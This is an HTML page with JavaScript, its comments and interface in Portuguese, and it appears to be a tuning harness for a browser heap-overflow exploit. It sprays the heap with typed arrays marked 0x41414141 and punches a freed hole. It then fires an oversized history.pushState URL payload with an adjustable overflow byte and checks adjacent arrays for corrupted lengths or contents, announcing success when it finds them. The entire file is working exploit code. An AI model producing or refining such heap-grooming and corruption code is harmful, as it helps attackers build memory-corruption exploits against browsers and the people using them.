<!DOCTYPE html>
<html>
<head>
    <title>Heap Tuner: Safe Mode</title>
    <style>
        body { background: #1a0505; color: #ff5555; font-family: 'Courier New', monospace; padding: 20px; user-select: none; }
        h1 { border-bottom: 2px solid #ff5555; padding-bottom: 10px; text-transform: uppercase; }
        
        .panel { background: #2b0a0a; border: 1px solid #551111; padding: 15px; margin-bottom: 15px; }
        
        .monitor { 
            font-size: 24px; font-weight: bold; color: #fff; 
            text-align: center; margin: 15px 0; 
            background: #000; padding: 10px; border: 1px solid #ff5555;
        }

        .log { 
            border: 1px solid #551111; height: 250px; overflow-y: scroll; 
            padding: 10px; background: #000; font-size: 13px; white-space: pre-wrap; color: #ccc;
        }

        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; }
        
        button { 
            padding: 10px 15px; font-family: inherit; font-weight: bold; 
            cursor: pointer; background: #441111; color: #fff; border: 1px solid #772222; 
        }
        button:hover { background: #772222; }
        button.action { background: #224422; border-color: #448844; color: #afa; width: 100%; margin-top: 10px; font-size: 18px; }
        
        .sub { color: #f99; font-size: 12px; }
    </style>
</head>
<body>
    <h1>TUNER: REVERSE SEARCH</h1>
    
    <div class="panel">
        <div style="text-align:center" class="sub">TAMANHO BASE DO PAYLOAD</div>
        <div class="monitor" id="sizeDisplay">709522</div>
        
        <div class="btn-group">
            <button onclick="adjustBase(-128)">-128</button>
            <button onclick="adjustBase(-64)">-64</button>
            <button onclick="adjustBase(-32)">-32</button>
            <button onclick="adjustBase(-16)">-16</button>
            <button onclick="adjustBase(-8)">-8</button>
            <button onclick="adjustBase(-1)">-1</button>
            <div style="width:10px"></div>
            <button onclick="adjustBase(1)">+1</button>
            <button onclick="adjustBase(8)">+8</button>
        </div>
        
        <div style="text-align:center; margin-top:15px;" class="sub">OVERFLOW EXTRA: <span id="ovfDisplay" style="color:#fff">0</span> Bytes</div>
        <div class="btn-group">
             <button onclick="setOverflow(0)">0 (Seguro)</button>
             <button onclick="setOverflow(1)">1 Byte</button>
        </div>
    </div>

    <button class="action" onclick="runTest()">EXECUTAR TESTE (Hole 168)</button>

    <div id="logger" class="log">Ajuste o tamanho BASE para menos até parar de crashar.</div>

    <script>
        const logger = document.getElementById('logger');
        
        // --- ESTADO INICIAL ---
        // Se 709522 está crashando, vamos assumir que ele é o culpado.
        var currentBase = 709522; 
        var currentOverflow = 0; // Começamos com ZERO overflow
        var spray = [];
        const MAGIC_NUM = 0x41414141;

        function log(msg, type='') {
            const d = document.createElement('div');
            d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type === 'success') { d.style.color = '#0f0'; d.style.fontWeight = 'bold'; }
            else if(type === 'error') { d.style.color = '#f55'; }
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        function adjustBase(amount) {
            currentBase += amount;
            updateDisplay();
        }
        
        function setOverflow(amount) {
            currentOverflow = amount;
            updateDisplay();
        }

        function updateDisplay() {
            document.getElementById('sizeDisplay').innerText = currentBase;
            document.getElementById('ovfDisplay').innerText = currentOverflow;
        }

        async function runTest() {
            let holeSize = 168; // Vamos fixar um tamanho que sabemos que alinha (ou use o que vc preferir)
            
            log("------------------------------------------");
            log(`TESTANDO: Base=${currentBase} | Overflow=${currentOverflow}`);
            
            // 1. Limpeza agressiva
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];
            
            // 2. Spray
            for(let i=0; i < 6000; i++) {
                let arr = new Uint32Array(1024); 
                arr[0] = MAGIC_NUM; 
                arr[1] = i;         
                spray.push(arr);
            }

            // 3. Buraco
            let center = 3000;
            for(let i=0; i < holeSize; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 600));

            // 4. Injeção
            try {
                let base = new Array(currentBase + 1).join('A');
                let overflow = "";
                if(currentOverflow > 0) {
                    overflow = new Array(currentOverflow + 1).join('B');
                }
                
                let payload = base + overflow; 
                
                // Usamos pushState. O ID único evita cache.
                history.pushState({}, "tuner_" + Date.now(), payload);
                
                checkCorruption(holeSize, center);

            } catch(e) {
                log("ERRO JS: " + e.message, "error");
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            let limit = startIdx + holeUsed + 40;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // Verifica Length
                    if(arr.length !== 1024) {
                        found = true;
                        reportSuccess(i, "LENGTH", arr.length);
                        return;
                    }
                    // Verifica Magic
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        reportSuccess(i, "CONTENT", arr.length);
                        return;
                    }
                }
            }
            if(!found) {
                log("Sem crash e sem corrupção. ESTÁVEL.", "success");
                log("DICA: Agora aumente o Base (+1) ou Overflow até corromper.");
            }
        }

        function reportSuccess(idx, type, len) {
            document.body.style.background = "#224422";
            log(`!!! ALVO ATINGIDO !!! Index: ${idx}`, "success");
            log(`Type: ${type} | New Length: ${len}`, "success");
            alert(`SUCESSO!\nBase Size: ${currentBase}\nOverflow: ${currentOverflow}`);
        }
    </script>
</body>
</html>
